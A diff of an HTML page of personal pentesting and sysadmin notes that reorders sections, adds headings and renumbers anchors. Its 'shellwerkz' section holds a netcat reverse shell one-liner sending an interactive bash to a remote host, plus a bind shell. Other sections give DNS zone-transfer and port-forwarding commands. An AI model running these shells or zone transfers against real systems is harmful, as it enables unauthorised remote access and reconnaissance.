@@ -25,9 +25,9 @@
         <link rel="stylesheet" href="fonts/fonts.css">
 
         <!-- Highlight.js Stylesheets -->
-        <link rel="stylesheet" href="highlight.css">
-        <link rel="stylesheet" href="tomorrow-night.css">
-        <link rel="stylesheet" href="ayu-highlight.css">
+        <link rel="stylesheet" id="highlight-css" href="highlight.css">
+        <link rel="stylesheet" id="tomorrow-night-css" href="tomorrow-night.css">
+        <link rel="stylesheet" id="ayu-highlight-css" href="ayu-highlight.css">
 
         <!-- Custom theme stylesheets -->
 
@@ -179,22 +179,31 @@
 <div style="break-before: page; page-break-before: always;"></div><h1 id="enumeration"><a class="header" href="#enumeration">Enumeration</a></h1>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="folders"><a class="header" href="#folders">Folders</a></h1>
 <h2 id="fuzzers"><a class="header" href="#fuzzers">Fuzzers</a></h2>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="infra"><a class="header" href="#infra">Infra</a></h1>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="shellwerkz"><a class="header" href="#shellwerkz">shellwerkz</a></h1>
+<p>You may need to use <a href="./netcat.html"><code>nc</code> with a proxy</a>.</p>
 <h1 id="reverse-shell"><a class="header" href="#reverse-shell">Reverse shell</a></h1>
 <h2 id="bash"><a class="header" href="#bash">bash</a></h2>
 <pre><code class="language-bash">mkfifo /tmp/ffifo; /bin/bash -i &lt; /tmp/ffifo 2&gt;&amp;1 | nc $remote_ip $port &gt; /tmp/ffifo
 </code></pre>
-<p>You may need to use <a href="./netcat.html"><code>nc</code> with a proxy</a>.</p>
 <h1 id="bind-shell"><a class="header" href="#bind-shell">Bind shell</a></h1>
+<h2 id="bash-1"><a class="header" href="#bash-1">bash</a></h2>
 <pre><code class="language-bash">mkfifo /tmp/f
 /bin/sh -i 2&gt;&amp;1 &lt; /tmp/f | nc -lvp $port &gt; /tmp/f
 </code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="dns-zone-transfer"><a class="header" href="#dns-zone-transfer">DNS Zone Transfer</a></h1>
+<h2 id="host"><a class="header" href="#host">host</a></h2>
+<pre><code class="language-bash">host -l &lt;domain&gt; &lt;dns-server&gt;
+</code></pre>
+<h2 id="dig"><a class="header" href="#dig">dig</a></h2>
+<pre><code class="language-bash">dig axfr &lt;domain&gt; @&lt;dns-server&gt;
+</code></pre>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="networking"><a class="header" href="#networking">Networking</a></h1>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="name-server-detection"><a class="header" href="#name-server-detection">Name Server detection</a></h1>
-<h2 id="dig"><a class="header" href="#dig">dig</a></h2>
+<h2 id="dig-1"><a class="header" href="#dig-1">dig</a></h2>
 <pre><code class="language-bash">dig ns $domain +short
 </code></pre>
-<h2 id="host"><a class="header" href="#host">host</a></h2>
+<h2 id="host-1"><a class="header" href="#host-1">host</a></h2>
 <pre><code class="language-bash">host -t ns $domain
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="netcat"><a class="header" href="#netcat">netcat</a></h1>
@@ -235,13 +244,6 @@ nc -lvp $to &lt; /tmp/f | nc localhost $from &gt; /tmp/f
 </blockquote>
 <h2 id="dynamic-port-forwarding"><a class="header" href="#dynamic-port-forwarding">Dynamic port forwarding</a></h2>
 <pre><code class="language-bash">ssh -D $lport $user@$server
-</code></pre>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="dns-zone-transfer"><a class="header" href="#dns-zone-transfer">DNS Zone Transfer</a></h1>
-<h2 id="host-1"><a class="header" href="#host-1">host</a></h2>
-<pre><code class="language-bash">host -l &lt;domain&gt; &lt;dns-server&gt;
-</code></pre>
-<h2 id="dig-1"><a class="header" href="#dig-1">dig</a></h2>
-<pre><code class="language-bash">dig axfr &lt;domain&gt; @&lt;dns-server&gt;
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="programming"><a class="header" href="#programming">Programming</a></h1>
 <p>Remember your <a href="https://gist.github.com/aliasgwynplaine">gists</a></p>
@@ -494,7 +496,7 @@ sigfillset(&amp;negmask);
 sigdelset(&amp;negmask, SIGINT);
 sigsuspend(&amp;negmask);
 </code></pre>
-<h2 id="bash-1"><a class="header" href="#bash-1">Bash</a></h2>
+<h2 id="bash-2"><a class="header" href="#bash-2">Bash</a></h2>
 <pre><code class="language-bash">trap ctrl_c INT
 
 function ctrl_c () {
@@ -654,7 +656,8 @@ void unregister_chrdev( unsigned int major, const char *name);
 <pre><code class="language-bash">fdisk
 </code></pre>
 <h2 id="windows"><a class="header" href="#windows">Windows</a></h2>
-<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="qemu"><a class="header" href="#qemu">qemu</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="containers--vms"><a class="header" href="#containers--vms">containers &amp; vms</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="qemu"><a class="header" href="#qemu">qemu</a></h1>
 <h2 id="qemu-img"><a class="header" href="#qemu-img">qemu-img</a></h2>
 <pre><code class="language-bash">qemu-img create -f vmdk $superdiskimg $size
 </code></pre>
